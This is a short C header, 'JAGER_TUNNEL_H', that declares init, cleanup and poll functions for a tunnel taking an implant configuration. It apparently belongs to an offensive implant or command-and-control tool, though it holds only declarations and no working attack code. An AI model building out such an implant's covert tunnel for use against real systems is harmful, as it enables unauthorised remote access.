#ifndef JAGER_TUNNEL_H
#define JAGER_TUNNEL_H

#include "config.h"

BOOL tunnel_init(PIMPLANT_CONFIG config);
void tunnel_cleanup(void);
BOOL tunnel_poll(PIMPLANT_CONFIG config);

#endif
